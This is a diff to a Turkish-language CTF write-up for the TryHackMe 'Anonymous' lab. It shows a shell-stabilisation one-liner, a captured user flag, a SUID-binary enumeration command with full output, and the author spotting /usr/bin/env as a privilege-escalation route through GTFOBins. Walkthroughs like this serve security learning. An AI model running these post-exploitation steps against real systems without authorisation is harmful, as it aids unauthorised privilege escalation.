@@ -147,7 +147,76 @@ Shellimizi stabil hale getirelim:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Anonymous/images/a3.png?raw=true)
 
+user flag:
+>90d6f992585815ff991e68748c414740
+
+Yetkimizi yükseltelim ve root bayrağına ulaşalım.
+
+```
+find / -perm -04000 -type f 2>/dev/null komutu ile hangi programların root’a ait olduğuna bakıyorum.
+```
+
+```
+namelessone@anonymous:~$ find / -perm -04000 -type f 2>/dev/null
+find / -perm -04000 -type f 2>/dev/null
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+/bin/umount
+/bin/fusermount
+/bin/ping
+/bin/mount
+/bin/su
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/pkexec
+```
+
+Buradaki /usr/bin/env dikkatimi çekiyor ve gtfobins sitesine gidip yetki yükseltip yükseltemeyeceğime bakıyorum.
 
 
 
